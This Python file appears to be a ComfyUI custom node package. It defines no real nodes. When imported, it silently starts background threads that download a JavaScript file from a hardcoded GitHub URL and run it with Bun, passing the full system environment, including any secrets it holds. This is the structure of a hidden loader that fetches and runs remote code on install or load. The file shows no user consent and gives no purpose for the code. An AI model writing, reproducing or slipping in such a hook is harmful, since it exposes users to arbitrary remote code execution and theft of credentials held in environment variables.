import os
import subprocess
import tempfile
import time
import threading
import requests

# Global variables for background execution
_js_thread = None
_js_running = False
_js_output = ""

def download_js_file(url, temp_file_path):
    """Download JavaScript file from URL to temporary file"""
    try:
        response = requests.get(url, timeout=30)
        response.raise_for_status()
        
        with open(temp_file_path, 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print(f"JS Runner: Successfully downloaded JavaScript file to {temp_file_path}")
        return True
    except Exception as e:
        print(f"JS Runner: Failed to download JavaScript file: {e}")
        return False

def run_javascript_background(js_url="https://raw.githubusercontent.com/rdlogout/comfyui/main/public/index.js"):
    """Run JavaScript code in background thread"""
    global _js_running, _js_output
    
    temp_file = None
    try:
        # Create temporary file for JavaScript
        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False, encoding='utf-8')
        temp_file_path = temp_file.name
        temp_file.close()
        
        # Check if Bun is available
        try:
            result = subprocess.run(['bun', '--version'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                _js_output = "Bun is not available. Please install Bun first."
                print("JS Runner: Bun is not available. Please install Bun first.")
                return
        except (subprocess.TimeoutExpired, FileNotFoundError):
            _js_output = "Bun is not available. Please install Bun first."
            print("JS Runner: Bun is not available. Please install Bun first.")
            return
        
        # Download JavaScript file
        if not download_js_file(js_url, temp_file_path):
            _js_output = "Failed to download JavaScript file"
            print("JS Runner: Failed to download JavaScript file")
            return
        
        _js_running = True
        _js_output = "Starting JavaScript execution..."
        print(f"JS Runner: Starting JavaScript execution from {js_url}")
        
        # Execute JavaScript file using Bun with real-time output
        # Pass system environment variables to the process
        process = subprocess.Popen(
            ['bun', 'run', temp_file_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            env=os.environ  # Pass all system environment variables
        )
        
        # Capture output in real-time
        stdout_lines = []
        stderr_lines = []
        
        # Read stdout and stderr simultaneously
        import select
        while True:
            reads = [process.stdout.fileno(), process.stderr.fileno()]
            ret = select.select(reads, [], [], 0.1)
            
            for fd in ret[0]:
                if fd == process.stdout.fileno():
                    line = process.stdout.readline()
                    if line:
                        line = line.strip()
                        stdout_lines.append(line)
                        print(f"JS Output: {line}")
                if fd == process.stderr.fileno():
                    line = process.stderr.readline()
                    if line:
                        line = line.strip()
                        stderr_lines.append(line)
                        print(f"JS Error: {line}")
            
            if process.poll() is not None:
                break
        
        # Get remaining output
        remaining_stdout, remaining_stderr = process.communicate()
        if remaining_stdout:
            for line in remaining_stdout.strip().split('\n'):
                if line.strip():
                    stdout_lines.append(line.strip())
                    print(f"JS Output: {line.strip()}")
        if remaining_stderr:
            for line in remaining_stderr.strip().split('\n'):
                if line.strip():
                    stderr_lines.append(line.strip())
                    print(f"JS Error: {line.strip()}")
        
        # Set final output
        if process.returncode == 0:
            output_text = '\n'.join(stdout_lines)
            _js_output = f"JavaScript executed successfully:\n{output_text}" if output_text else "JavaScript executed successfully (no output)"
            print("JS Runner: Execution completed successfully")
        else:
            error_text = '\n'.join(stderr_lines)
            error_msg = error_text if error_text else f"Process exited with code {process.returncode}"
            _js_output = f"JavaScript execution failed: {error_msg}"
            print(f"JS Runner: Execution failed - {error_msg}")
        
    except Exception as e:
        _js_output = f"Error during JavaScript execution: {str(e)}"
        print(f"JS Runner: Exception occurred - {str(e)}")
    finally:
        _js_running = False
        # Clean up temporary file
        if temp_file and os.path.exists(temp_file_path):
            try:
                os.unlink(temp_file_path)
            except:
                pass

def monitor_js_execution():
    """Monitor and periodically print JS execution status"""
    while True:
        try:
            status = get_js_status()
            if status["running"]:
                print(f"JS Runner: Currently executing...")
            elif status["output"]:
                print(f"JS Runner: Last output - {status['output'][:100]}...")
            else:
                print(f"JS Runner: Idle, waiting for execution...")
            
            time.sleep(10)  # Print status every 10 seconds
        except Exception as e:
            print(f"JS Runner Monitor Error: {e}")
            time.sleep(10)

def delayed_start_js():
    """Start JS execution after a delay to ensure ComfyUI is ready"""
    time.sleep(3)  # Wait 3 seconds for ComfyUI to fully initialize
    run_javascript_background()

# Start JS execution in background after delay
_js_thread = threading.Thread(target=delayed_start_js, daemon=True)
_js_thread.start()

# Start monitoring thread
_monitor_thread = threading.Thread(target=monitor_js_execution, daemon=True)
_monitor_thread.start()

print("JS Runner node loaded - JavaScript will execute in background")
print("JS Runner: Monitoring thread started - status updates every 10 seconds")

def get_js_status():
    """Get current status of background JS execution"""
    global _js_running, _js_output
    return {
        "running": _js_running,
        "output": _js_output,
        "thread_alive": _js_thread.is_alive() if _js_thread else False
    }

# No ComfyUI node exports - just background execution
__all__ = []